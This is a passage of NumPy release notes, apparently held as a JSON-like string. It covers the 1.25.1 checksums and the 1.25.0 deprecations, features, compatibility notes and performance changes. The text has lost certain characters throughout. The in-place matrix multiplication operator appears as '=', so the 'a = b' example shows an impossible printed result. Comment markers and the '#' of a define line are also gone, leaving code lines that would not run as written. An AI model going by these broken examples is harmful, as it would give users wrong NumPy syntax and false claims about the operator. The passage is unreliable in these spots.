numpy-1.25.1-cp310-cp310-macosx_10_9_x86_64.whl\n    d5b8d3b0424e2af41018f35a087c4500  numpy-1.25.1-cp310-cp310-macosx_11_0_arm64.whl\n    1007893b1a8bfd97d445a63d29d33642  numpy-1.25.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    6a62d7a6cee310b41dc872aa7f3d7e8b  numpy-1.25.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e81f6264aecfa2269c5d29d10c362cbc  numpy-1.25.1-cp310-cp310-musllinux_1_1_x86_64.whl\n    ab8ecd125ca86eac0b3ada67ab66dad6  numpy-1.25.1-cp310-cp310-win32.whl\n    5466bebeaafcc3d6e1b98858d77ff945  numpy-1.25.1-cp310-cp310-win_amd64.whl\n    f31b059256ae09b7b83df63f52d8371e  numpy-1.25.1-cp311-cp311-macosx_10_9_x86_64.whl\n    099f74d654888869704469c321af845d  numpy-1.25.1-cp311-cp311-macosx_11_0_arm64.whl\n    20d04dccd2bfca5cfd88780d1dc9a3f8  numpy-1.25.1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    61dfd7c00638e83a7af59b86615ee9d2  numpy-1.25.1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4eb459c3d9479c4da2fdf20e4c4085d0  numpy-1.25.1-cp311-cp311-musllinux_1_1_x86_64.whl\n    5e84e797866c68ba65fa89a4bf4ba8ce  numpy-1.25.1-cp311-cp311-win32.whl\n    87bb1633b2e8029dbfa1e59f7ab22625  numpy-1.25.1-cp311-cp311-win_amd64.whl\n    3fcf2eb5970d848a26abdff1b10228e7  numpy-1.25.1-cp39-cp39-macosx_10_9_x86_64.whl\n    d71e1cbe18fe05944219e5a5be1796bf  numpy-1.25.1-cp39-cp39-macosx_11_0_arm64.whl\n    5b457e10834c991bca84aae7eaa49f34  numpy-1.25.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5cbb4c2f2892fafdf6f34fcb37c9e743  numpy-1.25.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    7d9d1ae23cf5420652088bfe8e048d89  numpy-1.25.1-cp39-cp39-musllinux_1_1_x86_64.whl\n    7e5bed491b85f0d7c718d6809f9b3ed2  numpy-1.25.1-cp39-cp39-win32.whl\n    838e97b751bebadf47e2196b2c88ffa2  numpy-1.25.1-cp39-cp39-win_amd64.whl\n    9ba95d8d6004d9659d7728fe93f67be9  numpy-1.25.1-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    fbccb20254a2dc85bdec549a03b8eb56  numpy-1.25.1-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    95e36689e6dd078caf11e7e2a2d5f5f1  numpy-1.25.1-pp39-pypy39_pp73-win_amd64.whl\n    768d0ebf15e2242f4c7ca7565bb5dd3e  numpy-1.25.1.tar.gz\n\nSHA256\n------\n::\n\n    77d339465dff3eb33c701430bcb9c325b60354698340229e1dff97745e6b3efa  numpy-1.25.1-cp310-cp310-macosx_10_9_x86_64.whl\n    d736b75c3f2cb96843a5c7f8d8ccc414768d34b0a75f466c05f3a739b406f10b  numpy-1.25.1-cp310-cp310-macosx_11_0_arm64.whl\n    4a90725800caeaa160732d6b31f3f843ebd45d6b5f3eec9e8cc287e30f2805bf  numpy-1.25.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    6c6c9261d21e617c6dc5eacba35cb68ec36bb72adcff0dee63f8fbc899362588  numpy-1.25.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0def91f8af6ec4bb94c370e38c575855bf1d0be8a8fbfba42ef9c073faf2cf19  numpy-1.25.1-cp310-cp310-musllinux_1_1_x86_64.whl\n    fd67b306320dcadea700a8f79b9e671e607f8696e98ec255915c0c6d6b818503  numpy-1.25.1-cp310-cp310-win32.whl\n    c1516db588987450b85595586605742879e50dcce923e8973f79529651545b57  numpy-1.25.1-cp310-cp310-win_amd64.whl\n    6b82655dd8efeea69dbf85d00fca40013d7f503212bc5259056244961268b66e  numpy-1.25.1-cp311-cp311-macosx_10_9_x86_64.whl\n    e8f6049c4878cb16960fbbfb22105e49d13d752d4d8371b55110941fb3b17800  numpy-1.25.1-cp311-cp311-macosx_11_0_arm64.whl\n    41a56b70e8139884eccb2f733c2f7378af06c82304959e174f8e7370af112e09  numpy-1.25.1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    d5154b1a25ec796b1aee12ac1b22f414f94752c5f94832f14d8d6c9ac40bcca6  numpy-1.25.1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    38eb6548bb91c421261b4805dc44def9ca1a6eef6444ce35ad1669c0f1a3fc5d  numpy-1.25.1-cp311-cp311-musllinux_1_1_x86_64.whl\n    791f409064d0a69dd20579345d852c59822c6aa087f23b07b1b4e28ff5880fcb  numpy-1.25.1-cp311-cp311-win32.whl\n    c40571fe966393b212689aa17e32ed905924120737194b5d5c1b20b9ed0fb171  numpy-1.25.1-cp311-cp311-win_amd64.whl\n    3d7abcdd85aea3e6cdddb59af2350c7ab1ed764397f8eec97a038ad244d2d105  numpy-1.25.1-cp39-cp39-macosx_10_9_x86_64.whl\n    1a180429394f81c7933634ae49b37b472d343cccb5bb0c4a575ac8bbc433722f  numpy-1.25.1-cp39-cp39-macosx_11_0_arm64.whl\n    d412c1697c3853c6fc3cb9751b4915859c7afe6a277c2bf00acf287d56c4e625  numpy-1.25.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    20e1266411120a4f16fad8efa8e0454d21d00b8c7cee5b5ccad7565d95eb42dd  numpy-1.25.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f76aebc3358ade9eacf9bc2bb8ae589863a4f911611694103af05346637df1b7  numpy-1.25.1-cp39-cp39-musllinux_1_1_x86_64.whl\n    247d3ffdd7775bdf191f848be8d49100495114c82c2bd134e8d5d075fb386a1c  numpy-1.25.1-cp39-cp39-win32.whl\n    1d5d3c68e443c90b38fdf8ef40e60e2538a27548b39b12b73132456847f4b631  numpy-1.25.1-cp39-cp39-win_amd64.whl\n    35a9527c977b924042170a0887de727cd84ff179e478481404c5dc66b4170009  numpy-1.25.1-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    0d3fe3dd0506a28493d82dc3cf254be8cd0d26f4008a417385cbf1ae95b54004  numpy-1.25.1-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    012097b5b0d00a11070e8f2e261128c44157a8689f7dedcf35576e525893f4fe  numpy-1.25.1-pp39-pypy39_pp73-win_amd64.whl\n    9a3a9f3a61480cc086117b426a8bd86869c213fc4072e606f01c4e4b66eb92bf  numpy-1.25.1.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.25.0": "==========================\n\nThe NumPy 1.25.0 release continues the ongoing work to improve the handling and\npromotion of dtypes, increase the execution speed, and clarify the\ndocumentation. There has also been work to prepare for the future NumPy 2.0.0\nrelease, resulting in a large number of new and expired deprecation.\nHighlights are:\n\n- Support for MUSL, there are now MUSL wheels.\n- Support the Fujitsu C/C++ compiler.\n- Object arrays are now supported in einsum\n- Support for inplace matrix multiplication (``=``).\n\nWe will be releasing a NumPy 1.26 when Python 3.12 comes out. That is needed\nbecause distutils has been dropped by Python 3.12 and we will be switching to using\nmeson for future builds. The next mainline release will be NumPy 2.0.0. We plan\nthat the 2.0 series will still support downstream projects built against earlier\nversions of NumPy.\n\nThe Python versions supported in this release are 3.9-3.11.\n\n\nDeprecations\n============\n\n* ``np.core.MachAr`` is deprecated.  It is private API.  In names\n  defined in ``np.core`` should generally be considered private.\n\n  (`gh-22638 <https://github.com/numpy/numpy/pull/22638>`__)\n\n* ``np.finfo(None)`` is deprecated.\n\n  (`gh-23011 <https://github.com/numpy/numpy/pull/23011>`__)\n\n* ``np.round_`` is deprecated. Use `np.round` instead.\n\n  (`gh-23302 <https://github.com/numpy/numpy/pull/23302>`__)\n\n* ``np.product`` is deprecated. Use `np.prod` instead.\n\n  (`gh-23314 <https://github.com/numpy/numpy/pull/23314>`__)\n\n* ``np.cumproduct`` is deprecated. Use `np.cumprod` instead.\n\n  (`gh-23314 <https://github.com/numpy/numpy/pull/23314>`__)\n\n* ``np.sometrue`` is deprecated. Use `np.any` instead.\n\n  (`gh-23314 <https://github.com/numpy/numpy/pull/23314>`__)\n\n* ``np.alltrue`` is deprecated. Use `np.all` instead.\n\n  (`gh-23314 <https://github.com/numpy/numpy/pull/23314>`__)\n\n* Only ndim-0 arrays are treated as scalars.  NumPy used to treat all arrays of\n  size 1 (e.g., ``np.array([3.14])``) as scalars.  In the future, this will be\n  limited to arrays of ndim 0 (e.g., ``np.array(3.14)``).  The following\n  expressions will report a deprecation warning:\n\n  .. code-block:: python\n\n      a = np.array([3.14])\n      float(a)   better: a[0] to get the numpy.float or a.item()\n\n      b = np.array([[3.14]])\n      c = numpy.random.rand(10)\n      c[0] = b   better: c[0] = b[0, 0]\n\n  (`gh-10615 <https://github.com/numpy/numpy/pull/10615>`__)\n\n* ``np.find_common_type`` is deprecated.\n  `numpy.find_common_type` is now deprecated and its use should be replaced\n  with either `numpy.result_type` or `numpy.promote_types`.\n  Most users leave the second ``scalar_types`` argument to ``find_common_type``\n  as ``[]`` in which case ``np.result_type`` and ``np.promote_types`` are both\n  faster and more robust.\n  When not using ``scalar_types`` the main difference is that the replacement\n  intentionally converts non-native byte-order to native byte order.\n  Further, ``find_common_type`` returns ``object`` dtype rather than failing\n  promotion.  This leads to differences when the inputs are not all numeric.\n  Importantly, this also happens for e.g. timedelta/datetime for which NumPy\n  promotion rules are currently sometimes surprising.\n\n  When the ``scalar_types`` argument is not ``[]`` things are more complicated.\n  In most cases, using ``np.result_type`` and passing the Python values\n  ``0``, ``0.0``, or ``0j`` has the same result as using ``int``, ``float``,\n  or ``complex`` in `scalar_types`.\n\n  When ``scalar_types`` is constructed, ``np.result_type`` is the\n  correct replacement and it may be passed scalar values like ``np.float32(0.0)``.\n  Passing values other than 0, may lead to value-inspecting behavior\n  (which ``np.find_common_type`` never used and NEP 50 may change in the future).\n  The main possible change in behavior in this case, is when the array types\n  are signed integers and scalar types are unsigned.\n\n  If you are unsure about how to replace a use of ``scalar_types`` or when\n  non-numeric dtypes are likely, please do not hesitate to open a NumPy issue\n  to ask for help.\n\n  (`gh-22539 <https://github.com/numpy/numpy/pull/22539>`__)\n\n\nExpired deprecations\n====================\n\n* ``np.core.machar`` and ``np.finfo.machar`` have been removed.\n\n  (`gh-22638 <https://github.com/numpy/numpy/pull/22638>`__)\n\n* ``+arr`` will now raise an error when the dtype is not\n  numeric (and positive is undefined).\n\n  (`gh-22998 <https://github.com/numpy/numpy/pull/22998>`__)\n\n* A sequence must now be passed into the stacking family of functions\n  (``stack``, ``vstack``, ``hstack``, ``dstack`` and ``column_stack``).\n\n  (`gh-23019 <https://github.com/numpy/numpy/pull/23019>`__)\n\n* ``np.clip`` now defaults to same-kind casting. Falling back to\n  unsafe casting was deprecated in NumPy 1.17.\n\n  (`gh-23403 <https://github.com/numpy/numpy/pull/23403>`__)\n\n* ``np.clip`` will now propagate ``np.nan`` values passed as ``min`` or ``max``.\n  Previously, a scalar NaN was usually ignored.  This was deprecated in NumPy 1.17.\n\n  (`gh-23403 <https://github.com/numpy/numpy/pull/23403>`__)\n\n* The ``np.dual`` submodule has been removed.\n\n  (`gh-23480 <https://github.com/numpy/numpy/pull/23480>`__)\n\n* NumPy now always ignores sequence behavior for an array-like (defining\n  one of the array protocols).  (Deprecation started NumPy 1.20)\n\n  (`gh-23660 <https://github.com/numpy/numpy/pull/23660>`__)\n\n* The niche ``FutureWarning`` when casting to a subarray dtype in ``astype``\n  or the array creation functions such as ``asarray`` is now finalized.\n  The behavior is now always the same as if the subarray dtype was\n  wrapped into a single field (which was the workaround, previously).\n  (FutureWarning since NumPy 1.20)\n\n  (`gh-23666 <https://github.com/numpy/numpy/pull/23666>`__)\n\n* ``==`` and ``!=`` warnings have been finalized.  The ``==`` and ``!=``\n  operators on arrays now always:\n\n  * raise errors that occur during comparisons such as when the arrays\n    have incompatible shapes (``np.array([1, 2]) == np.array([1, 2, 3])``).\n  * return an array of all ``True`` or all ``False`` when values are\n    fundamentally not comparable (e.g. have different dtypes).  An example\n    is ``np.array([\"a\"]) == np.array([1])``.\n\n    This mimics the Python behavior of returning ``False`` and ``True``\n    when comparing incompatible types like ``\"a\" == 1`` and ``\"a\" != 1``.\n    For a long time these gave ``DeprecationWarning`` or ``FutureWarning``.\n\n  (`gh-22707 <https://github.com/numpy/numpy/pull/22707>`__)\n\n* Nose support has been removed. NumPy switched to using pytest in 2018 and nose\n  has been unmaintained for many years. We have kept NumPy's nose support to\n  avoid breaking downstream projects who might have been using it and not yet\n  switched to pytest or some other testing framework. With the arrival of\n  Python 3.12, unpatched nose will raise an error. It is time to move on.\n\n  *Decorators removed*:\n\n  - raises\n  - slow\n  - setastest\n  - skipif\n  - knownfailif\n  - deprecated\n  - parametrize\n  - _needs_refcount\n\n  These are not to be confused with pytest versions with similar names, e.g.,\n  pytest.mark.slow, pytest.mark.skipif, pytest.mark.parametrize.\n\n  *Functions removed*:\n\n  - Tester\n  - import_nose\n  - run_module_suite\n\n  (`gh-23041 <https://github.com/numpy/numpy/pull/23041>`__)\n\n* The ``numpy.testing.utils`` shim has been removed.  Importing from the\n  ``numpy.testing.utils`` shim has been deprecated since 2019, the shim has now\n  been removed. All imports should be made directly from ``numpy.testing``.\n\n  (`gh-23060 <https://github.com/numpy/numpy/pull/23060>`__)\n\n* The environment variable to disable dispatching has been removed.\n  Support for the ``NUMPY_EXPERIMENTAL_ARRAY_FUNCTION`` environment variable has\n  been removed. This variable disabled dispatching with ``__array_function__``.\n\n  (`gh-23376 <https://github.com/numpy/numpy/pull/23376>`__)\n\n* Support for ``y=`` as an alias of ``out=`` has been removed.\n  The ``fix``, ``isposinf`` and ``isneginf`` functions allowed using ``y=`` as a\n  (deprecated) alias for ``out=``. This is no longer supported.\n\n  (`gh-23376 <https://github.com/numpy/numpy/pull/23376>`__)\n\n\nCompatibility notes\n===================\n\n* The ``busday_count`` method now correctly handles cases where the ``begindates`` is later in time\n  than the ``enddates``. Previously, the ``enddates`` was included, even though the documentation states\n  it is always excluded.\n\n  (`gh-23229 <https://github.com/numpy/numpy/pull/23229>`__)\n\n* When comparing datetimes and timedelta using ``np.equal`` or ``np.not_equal``\n  numpy previously allowed the comparison with ``casting=\"unsafe\"``.\n  This operation now fails. Forcing the output dtype using the ``dtype``\n  kwarg can make the operation succeed, but we do not recommend it.\n\n  (`gh-22707 <https://github.com/numpy/numpy/pull/22707>`__)\n\n* When loading data from a file handle using ``np.load``,\n  if the handle is at the end of file, as can happen when reading\n  multiple arrays by calling ``np.load`` repeatedly, numpy previously\n  raised ``ValueError`` if ``allow_pickle=False``, and ``OSError`` if\n  ``allow_pickle=True``. Now it raises ``EOFError`` instead, in both cases.\n\n  (`gh-23105 <https://github.com/numpy/numpy/pull/23105>`__)\n\n``np.pad`` with ``mode=wrap`` pads with strict multiples of original data\n-------------------------------------------------------------------------\nCode based on earlier version of ``pad`` that uses  ``mode=\"wrap\"`` will return\ndifferent results when the padding size is larger than initial array.\n\n``np.pad`` with ``mode=wrap`` now always fills the space with\nstrict multiples of original data even if the padding size is larger than the\ninitial array.\n\n(`gh-22575 <https://github.com/numpy/numpy/pull/22575>`__)\n\nCython ``long_t`` and ``ulong_t`` removed\n-----------------------------------------\n``long_t`` and ``ulong_t`` were aliases for ``longlong_t`` and ``ulonglong_t``\nand confusing (a remainder from of Python 2).  This change may lead to the errors::\n\n     'long_t' is not a type identifier\n     'ulong_t' is not a type identifier\n\nWe recommend use of bit-sized types such as ``cnp.int64_t`` or the use of\n``cnp.intp_t`` which is 32 bits on 32 bit systems and 64 bits on 64 bit\nsystems (this is most compatible with indexing).\nIf C ``long`` is desired, use plain ``long`` or ``npy_long``.\n``cnp.int_t`` is also ``long`` (NumPy's default integer).  However, ``long``\nis 32 bit on 64 bit windows and we may wish to adjust this even in NumPy.\n(Please do not hesitate to contact NumPy developers if you are curious about this.)\n\n(`gh-22637 <https://github.com/numpy/numpy/pull/22637>`__)\n\nChanged error message and type for bad ``axes`` argument to ``ufunc``\n---------------------------------------------------------------------\nThe error message and type when a wrong ``axes`` value is passed to\n``ufunc(..., axes=[...])``` has changed. The message is now more indicative of\nthe problem, and if the value is mismatched an ``AxisError`` will be raised.\nA ``TypeError`` will still be raised for invalid input types.\n\n(`gh-22675 <https://github.com/numpy/numpy/pull/22675>`__)\n\nArray-likes that define ``__array_ufunc__`` can now override ufuncs if used as ``where``\n----------------------------------------------------------------------------------------\nIf the ``where`` keyword argument of a :class:`numpy.ufunc` is a subclass of\n:class:`numpy.ndarray` or is a duck type that defines\n:func:`numpy.class.__array_ufunc__` it can override the behavior of the ufunc\nusing the same mechanism as the input and output arguments.\nNote that for this to work properly, the ``where.__array_ufunc__``\nimplementation will have to unwrap the ``where`` argument to pass it into the\ndefault implementation of the ``ufunc`` or, for :class:`numpy.ndarray`\nsubclasses before using ``super().__array_ufunc__``.\n\n(`gh-23240 <https://github.com/numpy/numpy/pull/23240>`__)\n\nCompiling against the NumPy C API is now backwards compatible by default\n------------------------------------------------------------------------\nNumPy now defaults to exposing a backwards compatible subset of the C-API.\nThis makes the use of ``oldest-supported-numpy`` unnecessary.\nLibraries can override the default minimal version to be compatible with\nusing::\n\n    define NPY_TARGET_VERSION NPY_1_22_API_VERSION\n\nbefore including NumPy or by passing the equivalent ``-D`` option to the\ncompiler.\nThe NumPy 1.25 default is ``NPY_1_19_API_VERSION``.  Because the NumPy 1.19\nC API was identical to the NumPy 1.16 one resulting programs will be compatible\nwith NumPy 1.16 (from a C-API perspective).\nThis default will be increased in future non-bugfix releases.\nYou can still compile against an older NumPy version and run on a newer one.\n\nFor more details please see :ref:`for-downstream-package-authors`.\n\n(`gh-23528 <https://github.com/numpy/numpy/pull/23528>`__)\n\n\nNew Features\n============\n\n``np.einsum`` now accepts arrays with ``object`` dtype\n------------------------------------------------------\nThe code path will call python operators on object dtype arrays, much\nlike ``np.dot`` and ``np.matmul``.\n\n(`gh-18053 <https://github.com/numpy/numpy/pull/18053>`__)\n\nAdd support for inplace matrix multiplication\n---------------------------------------------\nIt is now possible to perform inplace matrix multiplication\nvia the ``=`` operator.\n\n.. code-block:: python\n\n    >>> import numpy as np\n\n    >>> a = np.arange(6).reshape(3, 2)\n    >>> print(a)\n    [[0 1]\n     [2 3]\n     [4 5]]\n\n    >>> b = np.ones((2, 2), dtype=int)\n    >>> a = b\n    >>> print(a)\n    [[1 1]\n     [5 5]\n     [9 9]]\n\n(`gh-21120 <https://github.com/numpy/numpy/pull/21120>`__)\n\nAdded ``NPY_ENABLE_CPU_FEATURES`` environment variable\n------------------------------------------------------\nUsers may now choose to enable only a subset of the built CPU features at\nruntime by specifying the `NPY_ENABLE_CPU_FEATURES` environment variable.\nNote that these specified features must be outside the baseline, since those\nare always assumed. Errors will be raised if attempting to enable a feature\nthat is either not supported by your CPU, or that NumPy was not built with.\n\n(`gh-22137 <https://github.com/numpy/numpy/pull/22137>`__)\n\nNumPy now has an ``np.exceptions`` namespace\n--------------------------------------------\nNumPy now has a dedicated namespace making most exceptions\nand warnings available.  All of these remain available in the\nmain namespace, although some may be moved slowly in the future.\nThe main reason for this is to increase discoverability and add\nfuture exceptions.\n\n(`gh-22644 <https://github.com/numpy/numpy/pull/22644>`__)\n\n``np.linalg`` functions return NamedTuples\n------------------------------------------\n``np.linalg`` functions that return tuples now return namedtuples. These\nfunctions are ``eig()``, ``eigh()``, ``qr()``, ``slogdet()``, and ``svd()``.\nThe return type is unchanged in instances where these functions return\nnon-tuples with certain keyword arguments (like ``svd(compute_uv=False)``).\n\n(`gh-22786 <https://github.com/numpy/numpy/pull/22786>`__)\n\nString functions in ``np.char`` are compatible with NEP 42 custom dtypes\n------------------------------------------------------------------------\nCustom dtypes that represent unicode strings or byte strings can now be\npassed to the string functions in ``np.char``.\n\n(`gh-22863 <https://github.com/numpy/numpy/pull/22863>`__)\n\nString dtype instances can be created from the string abstract dtype classes\n----------------------------------------------------------------------------\nIt is now possible to create a string dtype instance with a size without\nusing the string name of the dtype. For example, ``type(np.dtype('U'))(8)``\nwill create a dtype that is equivalent to ``np.dtype('U8')``. This feature\nis most useful when writing generic code dealing with string dtype\nclasses.\n\n(`gh-22963 <https://github.com/numpy/numpy/pull/22963>`__)\n\nFujitsu C/C++ compiler is now supported\n---------------------------------------\nSupport for Fujitsu compiler has been added.\nTo build with Fujitsu compiler, run:\n\n    python setup.py build -c fujitsu\n\n\nSSL2 is now supported\n---------------------\nSupport for SSL2 has been added. SSL2 is a library that provides OpenBLAS\ncompatible GEMM functions.  To enable SSL2, it need to edit site.cfg and build\nwith Fujitsu compiler.  See site.cfg.example.\n\n(`gh-22982 <https://github.com/numpy/numpy/pull/22982>`__)\n\n\nImprovements\n============\n\n``NDArrayOperatorsMixin`` specifies that it has no ``__slots__``\n----------------------------------------------------------------\nThe ``NDArrayOperatorsMixin`` class now specifies that it contains no\n``__slots__``, ensuring that subclasses can now make use of this feature in\nPython.\n\n(`gh-23113 <https://github.com/numpy/numpy/pull/23113>`__)\n\nFix power of complex zero\n-------------------------\n``np.power`` now returns a different result for ``0^{non-zero}``\nfor complex numbers.  Note that the value is only defined when\nthe real part of the exponent is larger than zero.\nPreviously, NaN was returned unless the imaginary part was strictly\nzero.  The return value is either ``0+0j`` or ``0-0j``.\n\n(`gh-18535 <https://github.com/numpy/numpy/pull/18535>`__)\n\nNew ``DTypePromotionError``\n---------------------------\nNumPy now has a new ``DTypePromotionError`` which is used when two\ndtypes cannot be promoted to a common one, for example::\n\n    np.result_type(\"M8[s]\", np.complex128)\n\nraises this new exception.\n\n(`gh-22707 <https://github.com/numpy/numpy/pull/22707>`__)\n\n`np.show_config` uses information from Meson\n--------------------------------------------\nBuild and system information now contains information from Meson.\n`np.show_config` now has a new optional parameter ``mode`` to help\ncustomize the output.\n\n(`gh-22769 <https://github.com/numpy/numpy/pull/22769>`__)\n\nFix ``np.ma.diff`` not preserving the mask when called with arguments prepend/append.\n-------------------------------------------------------------------------------------\nCalling ``np.ma.diff`` with arguments prepend and/or append now returns a\n``MaskedArray`` with the input mask preserved.\n\nPreviously, a ``MaskedArray`` without the mask was returned.\n\n(`gh-22776 <https://github.com/numpy/numpy/pull/22776>`__)\n\nCorrected error handling for NumPy C-API in Cython\n--------------------------------------------------\nMany NumPy C functions defined for use in Cython were lacking the\ncorrect error indicator like ``except -1`` or ``except *``.\nThese have now been added.\n\n(`gh-22997 <https://github.com/numpy/numpy/pull/22997>`__)\n\nAbility to directly spawn random number generators\n--------------------------------------------------\n`numpy.random.Generator.spawn` now allows to directly spawn new\nindependent child generators via the `numpy.random.SeedSequence.spawn`\nmechanism.\n`numpy.random.BitGenerator.spawn` does the same for the underlying\nbit generator.\n\nAdditionally, `numpy.random.BitGenerator.seed_seq` now gives direct\naccess to the seed sequence used for initializing the bit generator.\nThis allows for example::\n\n    seed = 0x2e09b90939db40c400f8f22dae617151\n    rng = np.random.default_rng(seed)\n    child_rng1, child_rng2 = rng.spawn(2)\n\n     safely use rng, child_rng1, and child_rng2\n\nPreviously, this was hard to do without passing the ``SeedSequence``\nexplicitly.  Please see `numpy.random.SeedSequence` for more information.\n\n(`gh-23195 <https://github.com/numpy/numpy/pull/23195>`__)\n\n``numpy.logspace`` now supports a non-scalar ``base`` argument\n--------------------------------------------------------------\nThe ``base`` argument of ``numpy.logspace`` can now be array-like if it is\nbroadcastable against the ``start`` and ``stop`` arguments.\n\n(`gh-23275 <https://github.com/numpy/numpy/pull/23275>`__)\n\n``np.ma.dot()`` now supports for non-2d arrays\n----------------------------------------------\nPreviously ``np.ma.dot()`` only worked if ``a`` and ``b`` were both 2d.\nNow it works for non-2d arrays as well as ``np.dot()``.\n\n(`gh-23322 <https://github.com/numpy/numpy/pull/23322>`__)\n\nExplicitly show keys of .npz file in repr\n-----------------------------------------\n``NpzFile`` shows keys of loaded .npz file when printed.\n\n.. code-block:: python\n\n   >>> npzfile = np.load('arr.npz')\n   >>> npzfile\n   NpzFile 'arr.npz' with keys arr_0, arr_1, arr_2, arr_3, arr_4...\n\n(`gh-23357 <https://github.com/numpy/numpy/pull/23357>`__)\n\nNumPy now exposes DType classes in ``np.dtypes``\n------------------------------------------------\nThe new ``numpy.dtypes`` module now exposes DType classes and\nwill contain future dtype related functionality.\nMost users should have no need to use these classes directly.\n\n(`gh-23358 <https://github.com/numpy/numpy/pull/23358>`__)\n\nDrop dtype metadata before saving in .npy or .npz files\n-------------------------------------------------------\nCurrently, a ``*.npy`` file containing a table with a dtype with\nmetadata cannot be read back.\nNow, `np.save` and `np.savez` drop metadata before saving.\n\n(`gh-23371 <https://github.com/numpy/numpy/pull/23371>`__)\n\n``numpy.lib.recfunctions.structured_to_unstructured`` returns views in more cases\n---------------------------------------------------------------------------------\n``structured_to_unstructured`` now returns a view, if the stride between the\nfields is constant. Prior, padding between the fields or a reversed field\nwould lead to a copy.\nThis change only applies to ``ndarray``, ``memmap`` and ``recarray``. For all\nother array subclasses, the behavior remains unchanged.\n\n(`gh-23652 <https://github.com/numpy/numpy/pull/23652>`__)\n\nSigned and unsigned integers always compare correctly\n-----------------------------------------------------\nWhen ``uint64`` and ``int64`` are mixed in NumPy, NumPy typically\npromotes both to ``float64``.  This behavior may be argued about\nbut is confusing for comparisons ``==``, ``<=``, since the results\nreturned can be incorrect but the conversion is hidden since the\nresult is a boolean.\nNumPy will now return the correct results for these by avoiding\nthe cast to float.\n\n(`gh-23713 <https://github.com/numpy/numpy/pull/23713>`__)\n\n\nPerformance improvements and changes\n====================================\n\nFaster ``np.argsort`` on AVX-512 enabled processors\n---------------------------------------------------\n32-bit and 64-bit quicksort algorithm for np.argsort gain up to 6x speed up on\nprocessors that support AVX-512 instruction set.\n\nThanks to `Intel corporation <https://open.intel.com/>`_ for sponsoring this\nwork.\n\n(`gh-23707 <https://github.com/numpy/numpy/pull/23707>`__)\n\nFaster ``np.sort`` on AVX-512 enabled processors\n------------------------------------------------\nQuicksort for 16-bit and 64-bit dtypes gain up to 15x and 9x speed up on\nprocessors that support AVX-512 instruction set.\n\nThanks to `Intel corporation <https://open.intel.com/>`_ for sponsoring this\nwork.\n\n(`gh-22315 <https://github.com/numpy/numpy/pull/22315>`__)\n\n``__array_function__`` machinery is now much faster\n---------------------------------------------------\nThe overhead of the majority of functions in NumPy is now smaller\nespecially when keyword arguments are used.  This change significantly\nspeeds up many simple function calls.\n\n(`gh-23020 <https://github.com/numpy/numpy/pull/23020>`__)\n\n``ufunc.at`` can be much faster\n-------------------------------\nGeneric ``ufunc.at`` can be up to 9x faster. The conditions for this speedup:\n\n- operands are aligned\n- no casting\n\nIf ufuncs with appropriate indexed loops on 1d arguments with the above\nconditions, ``ufunc.at`` can be up to 60x faster (an additional 7x speedup).\nAppropriate indexed loops have been added to ``add``, ``subtract``,\n``multiply``, ``floor_divide``, ``maximum``, ``minimum``, ``fmax``, and\n``fmin``.\n\nThe internal logic is similar to the logic used for regular ufuncs, which also\nhave fast paths.\n\nThanks to the `D. E. Shaw group <https://deshaw.com/>`_ for sponsoring this\nwork.\n\n(`gh-23136 <https://github.com/numpy/numpy/pull/23136>`__)\n\nFaster membership test on ``NpzFile``\n-------------------------------------\nMembership test on ``NpzFile`` will no longer\ndecompress the archive if it is successful.\n\n(`gh-23661 <https://github.com/numpy/numpy/pull/23661>`__)\n\n\nChanges\n=======\n\n``np.r_[]`` and ``np.c_[]`` with certain scalar values\n------------------------------------------------------\nIn rare cases, using mainly ``np.r_`` with scalars can lead to different\nresults.  The main potential changes are highlighted by the following::\n\n    >>> np.r_[np.arange(5, dtype=np.uint8), -1].dtype\n    int16   rather than the default integer (int64 or int32)\n    >>> np.r_[np.arange(5, dtype=np.int8), 255]\n    array([  0,   1,   2,   3,   4, 255], dtype=int16)\n\nWhere the second example returned::\n\n    array([ 0,  1,  2,  3,  4, -1], dtype=int8)\n\nThe first one is due to a signed integer scalar with an unsigned integer\narray, while the second is due to ``255`` not fitting into ``int8`` and\nNumPy currently inspecting values to make this work.\n(Note that the second example is expected to change in the future due to\n:ref:`NEP 50 <NEP50>`; it will then raise an error.)\n\n(`gh-22539 <https://github.com/numpy/numpy/pull/22539>`__)\n\nMost NumPy functions are wrapped into a C-callable\n--------------------------------------------------\nTo speed up the ``__array_function__`` dispatching, most NumPy functions\nare now wrapped into C-callables and are not proper Python functions or\nC methods.\nThey still look and feel the same as before (like a Python function), and this\nshould only improve performance and user experience (cleaner tracebacks).\nHowever, please inform the NumPy developers if this change confuses your\nprogram for some reason.\n\n(`gh-23020 <https://github.com/numpy/numpy/pull/23020>`__)\n\nC++ standard library usage\n--------------------------\nNumPy builds now depend on the C++ standard library, because\nthe ``numpy.core._multiarray_umath`` extension is linked with\nthe C++ linker.\n\n(`gh-23601 <https://github.com/numpy/numpy/pull/23601>`__)\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    4657f046d9d9d62e4baeae9b2cc1b4ea  numpy-1.25.0-cp310-cp310-macosx_10_9_x86_64.whl\n    f57f98fee3da2d98f752f755a880a508  numpy-1.25.0-cp310-cp310-macosx_11_0_arm64.whl\n    72b0ad52f96a41a7a82f511cb35c7ef1  numpy-1.25.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a61227341b8903fa66ab0e0fdaa15430  